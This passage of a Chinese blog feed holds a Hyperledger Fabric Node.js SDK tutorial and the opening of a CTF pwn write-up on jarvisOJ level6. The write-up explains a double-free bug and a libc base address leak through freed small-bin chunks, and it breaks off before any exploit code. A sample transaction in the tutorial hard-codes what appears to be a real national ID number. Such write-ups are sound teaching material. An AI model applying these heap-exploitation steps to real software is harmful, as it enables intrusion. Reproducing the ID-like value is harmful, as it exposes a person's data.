      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>fabric_node_sdk的编写与运行</title>
      <link href="/2019/08/15/fabric-node-sdk/"/>
      <url>/2019/08/15/fabric-node-sdk/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这两周主要学习了一下如何用nodejs搭建hyperledger fabric的sdk。</p><h4 id="fabric-node-sdk环境搭建"><a href="#fabric-node-sdk环境搭建" class="headerlink" title="fabric_node_sdk环境搭建"></a>fabric_node_sdk环境搭建</h4><p>更新npm镜像源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>查看npm镜像源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>成功则返回<a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a></p><p>下载fabric_node_sdk的最新版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/go/src/github.com/hyperledger/fabric</span><br><span class="line">git <span class="built_in">clone</span> -b release-1.4 https://github.com/hyperledger/fabric-sdk-node.git</span><br></pre></td></tr></table></figure><p>根据package.json安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/go/src/github.com/hyperledger/fabric/fabric-sdk-node</span><br><span class="line"><span class="built_in">cd</span> fabric-common &amp;&amp; npm install &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> fabric-ca-client &amp;&amp; npm install &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> fabric-client &amp;&amp; npm install &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> fabric-network &amp;&amp; npm install &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"> </span><br><span class="line"><span class="built_in">cd</span> ~/go/src/github.com/hyperledger/fabric/fabric-sdk-node</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>这个过程有可能出错，一般的警告可以忽略。提示需要且未安装的包可自行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install &lt;pacakge&gt;@[version] --save</span><br></pre></td></tr></table></figure><p>–save参数是将该包加入package.json的dependencies中。</p><h4 id="nodejs脚本编写及运行"><a href="#nodejs脚本编写及运行" class="headerlink" title="nodejs脚本编写及运行"></a>nodejs脚本编写及运行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/go/src/github.com/hyperledger/fabric/checkinsystem/node_sdk</span><br></pre></td></tr></table></figure><p>结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">node_sdk</span><br><span class="line">   ├── connprofile.json</span><br><span class="line">   ├── enrollAdmin.js</span><br><span class="line">   ├── invoke.js</span><br><span class="line">   ├── package.json</span><br><span class="line">   ├── query.js</span><br><span class="line">   ├── registerUser.js</span><br><span class="line">   └── wallet</span><br></pre></td></tr></table></figure><p>package.json主要依赖包如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"dependencies"</span>: &#123;</span><br><span class="line">       <span class="string">"fabric-ca-client"</span>: <span class="string">"~1.4.0"</span>,</span><br><span class="line">       <span class="string">"fabric-network"</span>: <span class="string">"~1.4.0"</span></span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="string">"devDependencies"</span>: &#123;</span><br><span class="line">       <span class="string">"chai"</span>: <span class="string">"^4.2.0"</span>,</span><br><span class="line">       <span class="string">"eslint"</span>: <span class="string">"^5.9.0"</span>,</span><br><span class="line">       <span class="string">"mocha"</span>: <span class="string">"^5.2.0"</span>,</span><br><span class="line">       <span class="string">"nyc"</span>: <span class="string">"^13.1.0"</span>,</span><br><span class="line">       <span class="string">"sinon"</span>: <span class="string">"^7.1.1"</span>,</span><br><span class="line">       <span class="string">"sinon-chai"</span>: <span class="string">"^3.3.0"</span></span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>安装好相关依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>查看org1中有哪些用户</p><p><img alt="" data-src="/2019/08/15/fabric-node-sdk/1.JPG" class="lazyload"></p><p>有Admin和User1两个用户，下面来创建这两个用相关的sdk。</p><p>enrollAdmin.js编写，创建admin</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> FabricCAServices = <span class="built_in">require</span>(<span class="string">'fabric-ca-client'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; FileSystemWallet, X509WalletMixin &#125; = <span class="built_in">require</span>(<span class="string">'fabric-network'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a new CA client for interacting with the CA.</span></span><br><span class="line">        <span class="keyword">const</span> keyPath = path.join(__dirname, <span class="string">"../../fabric-samples/first-network/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/keystore/5ff3716b887dd7c97b8276eab73bebc95cd1119625110ea0984cc8d559ed16a2_sk"</span>);</span><br><span class="line">        <span class="keyword">const</span> keyPEM = Buffer.from(fs.readFileSync(keyPath)).toString();</span><br><span class="line">        <span class="keyword">const</span> certPath = path.join(__dirname, <span class="string">"../../fabric-samples/first-network/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/signcerts/Admin@org1.example.com-cert.pem"</span>);</span><br><span class="line">        <span class="keyword">const</span> certPEM = Buffer.from(fs.readFileSync(certPath)).toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a new file system based wallet for managing identities.</span></span><br><span class="line">        <span class="keyword">const</span> walletPath = path.join(process.cwd(), <span class="string">'wallet'</span>);</span><br><span class="line">        <span class="keyword">const</span> wallet = <span class="keyword">new</span> FileSystemWallet(walletPath);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Wallet path: <span class="subst">$&#123;walletPath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if we've already enrolled the admin user.</span></span><br><span class="line">        <span class="keyword">const</span> adminExists = <span class="keyword">await</span> wallet.exists(<span class="string">'admin'</span>);</span><br><span class="line">        <span class="keyword">if</span> (adminExists) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'An identity for the admin user "admin" already exists in the wallet'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Enroll the admin user, and import the new identity into the wallet.</span></span><br><span class="line">        <span class="keyword">const</span> identity = X509WalletMixin.createIdentity(<span class="string">'Org1MSP'</span>, certPEM, keyPEM);</span><br><span class="line">        wallet.import(<span class="string">'admin'</span>, identity);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Successfully enrolled admin user "admin" and imported it into the wallet'</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">`Failed to enroll admin user "admin": <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">        process.exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure><p>其中keyPath中的文件要换成自己环境下的文件，运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node enroll.js</span><br></pre></td></tr></table></figure><p>registerUser.js编写，注册user1用户</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; FileSystemWallet, Gateway, X509WalletMixin &#125; = <span class="built_in">require</span>(<span class="string">'fabric-network'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> keyPath = path.join(__dirname, <span class="string">"../../fabric-samples/first-network/crypto-config/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp/keystore/cc111873571e461c95bce39dfe59af3bb17d4600643753dca9ff4fd84409c9d1_sk"</span>);</span><br><span class="line">        <span class="keyword">const</span> keyPEM = Buffer.from(fs.readFileSync(keyPath)).toString();</span><br><span class="line">        <span class="keyword">const</span> certPath = path.join(__dirname, <span class="string">"../../fabric-samples/first-network/crypto-config/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp/signcerts/User1@org1.example.com-cert.pem"</span>);</span><br><span class="line">        <span class="keyword">const</span> certPEM = Buffer.from(fs.readFileSync(certPath)).toString();</span><br><span class="line">        <span class="comment">// Create a new file system based wallet for managing identities.</span></span><br><span class="line">        <span class="keyword">const</span> walletPath = path.join(process.cwd(), <span class="string">'wallet'</span>);</span><br><span class="line">        <span class="keyword">const</span> wallet = <span class="keyword">new</span> FileSystemWallet(walletPath);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Wallet path: <span class="subst">$&#123;walletPath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if we've already enrolled the user.</span></span><br><span class="line">        <span class="keyword">const</span> userExists = <span class="keyword">await</span> wallet.exists(<span class="string">'user1'</span>);</span><br><span class="line">        <span class="keyword">if</span> (userExists) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'An identity for the user "user1" already exists in the wallet'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if we've already enrolled the admin user.</span></span><br><span class="line">        <span class="keyword">const</span> adminExists = <span class="keyword">await</span> wallet.exists(<span class="string">'admin'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!adminExists) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'An identity for the admin user "admin" does not exist in the wallet'</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Run the enrollAdmin.js application before retrying'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a new gateway for connecting to our peer node.</span></span><br><span class="line">        <span class="keyword">const</span> gateway = <span class="keyword">new</span> Gateway();</span><br><span class="line">        <span class="keyword">await</span> gateway.connect(path.join(__dirname, <span class="string">'./connprofile.json'</span>),</span><br><span class="line">        &#123;</span><br><span class="line">            wallet: wallet,</span><br><span class="line">            identity: <span class="string">'admin'</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Register the user, enroll the user, and import the new identity into the wallet.</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> userIdentity = X509WalletMixin.createIdentity(<span class="string">'Org1MSP'</span>, certPEM, keyPEM);</span><br><span class="line">        wallet.import(<span class="string">'user1'</span>, userIdentity);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Successfully registered and enrolled admin user "user1" and imported it into the wallet'</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">`Failed to register user "user1": <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">        process.exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure><p>然后实现invoke和query相关的SDK</p><p>invoke.js编写，用来增删改操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; FileSystemWallet, Gateway &#125; = <span class="built_in">require</span>(<span class="string">'fabric-network'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a new file system based wallet for managing identities.</span></span><br><span class="line">        <span class="keyword">const</span> walletPath = path.join(process.cwd(), <span class="string">'wallet'</span>);</span><br><span class="line">        <span class="keyword">const</span> wallet = <span class="keyword">new</span> FileSystemWallet(walletPath);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Wallet path: <span class="subst">$&#123;walletPath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if we've already enrolled the user.</span></span><br><span class="line">        <span class="keyword">const</span> userExists = <span class="keyword">await</span> wallet.exists(<span class="string">'user1'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!userExists) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'An identity for the user "user1" does not exist in the wallet'</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Run the registerUser.js application before retrying'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a new gateway for connecting to our peer node.</span></span><br><span class="line">        <span class="keyword">const</span> gateway = <span class="keyword">new</span> Gateway();</span><br><span class="line">        <span class="keyword">await</span> gateway.connect(path.join(__dirname, <span class="string">'./connprofile.json'</span>), &#123; wallet, <span class="attr">identity</span>: <span class="string">'user1'</span>, <span class="attr">discovery</span>: &#123; <span class="attr">enabled</span>: <span class="literal">false</span> &#125; &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the network (channel) our contract is deployed to.</span></span><br><span class="line">        <span class="keyword">const</span> network = <span class="keyword">await</span> gateway.getNetwork(<span class="string">'mychannel'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the contract from the network.</span></span><br><span class="line">        <span class="keyword">const</span> contract = network.getContract(<span class="string">'checkinsystem'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Submit the specified transaction.</span></span><br><span class="line">        <span class="comment">// createCar transaction - requires 5 argument, ex: ('createCar', 'CAR12', 'Honda', 'Accord', 'Black', 'Tom')</span></span><br><span class="line">        <span class="comment">// changeCarOwner transaction - requires 2 args , ex: ('changeCarOwner', 'CAR10', 'Dave')</span></span><br><span class="line">        <span class="keyword">await</span> contract.submitTransaction(<span class="string">'create'</span>, <span class="string">"ACCOUNT2"</span>,<span class="string">"0001"</span>,<span class="string">"0002"</span>,<span class="string">"0003"</span>,<span class="string">"0004"</span>,<span class="string">"420222199804295996"</span>,<span class="string">"123456"</span>,<span class="string">"kangel"</span>,<span class="string">"10"</span>,<span class="string">"11"</span>,<span class="string">"12"</span>,<span class="string">"0"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Transaction has been submitted'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Disconnect from the gateway.</span></span><br><span class="line">        <span class="keyword">await</span> gateway.disconnect();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">`Failed to submit transaction: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">        process.exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img alt="" data-src="/2019/08/15/fabric-node-sdk/2.JPG" class="lazyload"></p><p>查看couchdb</p><p><img alt="" data-src="/2019/08/15/fabric-node-sdk/3.jpg" class="lazyload"></p><p>query.js编写，用来进行查询操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; FileSystemWallet, Gateway &#125; = <span class="built_in">require</span>(<span class="string">'fabric-network'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a new file system based wallet for managing identities.</span></span><br><span class="line">        <span class="keyword">const</span> walletPath = path.join(process.cwd(), <span class="string">'wallet'</span>);</span><br><span class="line">        <span class="keyword">const</span> wallet = <span class="keyword">new</span> FileSystemWallet(walletPath);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Wallet path: <span class="subst">$&#123;walletPath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if we've already enrolled the user.</span></span><br><span class="line">        <span class="keyword">const</span> userExists = <span class="keyword">await</span> wallet.exists(<span class="string">'user1'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!userExists) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'An identity for the user "user1" does not exist in the wallet'</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Run the registerUser.js application before retrying'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a new gateway for connecting to our peer node.</span></span><br><span class="line">        <span class="keyword">const</span> gateway = <span class="keyword">new</span> Gateway();</span><br><span class="line">        <span class="keyword">await</span> gateway.connect(path.join(__dirname, <span class="string">'./connprofile.json'</span>), &#123; wallet, <span class="attr">identity</span>: <span class="string">'user1'</span>, <span class="attr">discovery</span>: &#123; <span class="attr">enabled</span>: <span class="literal">false</span> &#125; &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the network (channel) our contract is deployed to.</span></span><br><span class="line">        <span class="keyword">const</span> network = <span class="keyword">await</span> gateway.getNetwork(<span class="string">'mychannel'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the contract from the network.</span></span><br><span class="line">        <span class="keyword">const</span> contract = network.getContract(<span class="string">'checkinsystem'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Evaluate the specified transaction.</span></span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> contract.evaluateTransaction(<span class="string">'query'</span>,<span class="string">'ACCOUNT0'</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Transaction has been evaluated, result is: <span class="subst">$&#123;result.toString()&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">`Failed to evaluate transaction: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">        process.exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img alt="" data-src="/2019/08/15/fabric-node-sdk/4.jpg" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> 区块链学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blockchain </tag>
            
            <tag> hyperledger </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN学习之unlink</title>
      <link href="/2019/08/07/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8Bunlink/"/>
      <url>/2019/08/07/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8Bunlink/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>我发现pwn的利用还是要专注于程序本身，之前一直都是模棱两可，以至于题目从远程到本地就不知道如何修改脚本了。就这道题目而言，花了两天算是彻底搞通了。题目来自jarvisOJ pwn level6（<a href="https://www.jarvisoj.com/challenges）" target="_blank" rel="noopener">https://www.jarvisoj.com/challenges）</a></p><p>下面将通过静态分析、动态调试以及unlink等堆技巧的利用详解该题目</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>首先当时是要搞清楚程序的内容，然后发现漏洞从而利用。</p><p>checksec 一下</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/2.JPG" class="lazyload"></p><p>32位程序，No RELRO说明got表可写。用ida查看程序</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/3.JPG" class="lazyload"></p><p>查看sub_8048810，建立堆索引</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/4.JPG" class="lazyload"></p><p>查看sub_8048860，list函数</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/5.JPG" class="lazyload"></p><p>查看sub_80488E0，new函数</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/6-1.JPG" class="lazyload"></p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/6-2.JPG" class="lazyload"></p><p>查看sub_8048670，创建note函数。存在内存泄露，后面会验证。</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/7.JPG" class="lazyload"></p><p>查看sub_80489D0，edit函数</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/8.JPG" class="lazyload"></p><p>查看sub_8048AD0，delete函数。该函数free掉的堆块没有清零，free的时候也没有进行长度或标志位的判断，存在double free！</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/9.JPG" class="lazyload"></p><h4 id="泄露libc基地址"><a href="#泄露libc基地址" class="headerlink" title="泄露libc基地址"></a>泄露libc基地址</h4><p>note的大小为0x80的整数倍，0x80大小的chunk属于small chunk。free之后会放到small bin中，而且free之后的chunk0的fd、bk会指向main arena中的特定值。首先new两个长度为16的note，然后delete第一个</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/10.JPG" class="lazyload"></p><p>从上面的图中可以看到索引堆的结构，free掉的堆地址还在索引堆里面，以及main arena中的特定值<code>0xf7fb87b0</code>。下面计算它与libc基地址的固定偏移</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/12.JPG" class="lazyload"></p><p>固定偏移为0x1b07b0。再new一个长度小于4的note覆盖掉fd，然后list就可泄露bk，减掉固定偏移就是libc基地址。<code>0a</code>为回车换行符</p><p><img 